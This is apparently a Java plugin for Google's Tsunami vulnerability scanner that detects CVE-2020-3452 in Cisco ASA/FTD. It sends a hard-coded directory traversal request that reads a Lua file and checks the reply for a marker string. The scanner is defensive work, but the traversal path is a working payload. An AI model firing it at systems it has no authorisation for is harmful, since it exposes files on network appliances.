/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.cves.cve20203452;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;

import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

@PluginInfo(
		type = PluginType.VULN_DETECTION,
		name = "CVE-2020-3452",
		version = "0.1",
		description = "A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system",
		author = "wuqi5700",
		bootstrapModule = CVE20203452DetectorBootstrapModule.class)

public final class CVE20203452VulnDetector implements VulnDetector {

	private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

	private static final String CHECK_VUL_PATH = "+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../";

	public static final String DETECTION_STRING = "INTERNAL_PASSWORD_ENABLED";


	private final HttpClient httpClient;

	private final Clock utcClock;

	// by the scanner.
	@Inject
	CVE20203452VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
		this.httpClient = checkNotNull(httpClient);
		this.utcClock = checkNotNull(utcClock);
	}

	@Override
	public DetectionReportList detect(
			TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
		logger.atInfo().log("CVE-2020-3452 starts detecting.");

		return DetectionReportList.newBuilder()
				.addAllDetectionReports(
						matchedServices.stream()
								.filter(NetworkServiceUtils::isWebService)
								.filter(this::isServiceVulnerable)
								.map(networkService -> buildDetectionReport(targetInfo, networkService))
								.collect(toImmutableList()))
				.build();
	}

	private boolean isServiceVulnerable(NetworkService networkService) {
		String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CHECK_VUL_PATH;
		try {
			HttpResponse httpResponse = this.httpClient.send(
					HttpRequest.get(targetUri).withEmptyHeaders().
							build(),
					networkService);
			if (httpResponse.status().code() != 200) {
				return false;
			} else {
				return httpResponse.status().code() == 200 && (httpResponse.bodyString().get()).contains(DETECTION_STRING);
			}
		} catch (IOException e) {
			logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
			return false;
		}
	}

	// This builds the DetectionReport message for a specific vulnerable network service.
	private DetectionReport buildDetectionReport(
			TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
		return DetectionReport.newBuilder()
				.setTargetInfo(targetInfo)
				.setNetworkService(vulnerableNetworkService)
				.setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
				.setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
				.setVulnerability(
						Vulnerability.newBuilder()
								.setMainId(
										VulnerabilityId.newBuilder()
												.setPublisher("TSUNAMI_COMMUNITY")
												.setValue("CVE_2020_3452"))
								.setSeverity(Severity.HIGH)
								.setTitle("CVE-2020-3452")
								.setDescription("A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system"))
				.build();
	}
}
